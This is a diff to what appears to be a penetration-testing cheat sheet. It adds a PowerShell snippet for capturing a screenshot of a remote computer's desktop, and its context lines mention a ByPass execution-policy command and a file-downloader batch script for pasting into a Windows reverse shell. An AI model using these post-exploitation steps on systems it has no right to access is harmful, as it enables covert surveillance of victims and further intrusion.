@@ -607,6 +607,18 @@ CMD C:\> powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\Powe
 # Other files
 Here are few other handy scripts and things...
 
+## Capture a screen shot
+The following powershell commands can be used to capture a screen shot of the remote computers desktop and store it as a BMP file.
+```powershell
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
+$bitmap.Save('screen1.bmp')
+```
+
 **CopyAndPasteFileDownloader.bat**
 
 Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line)
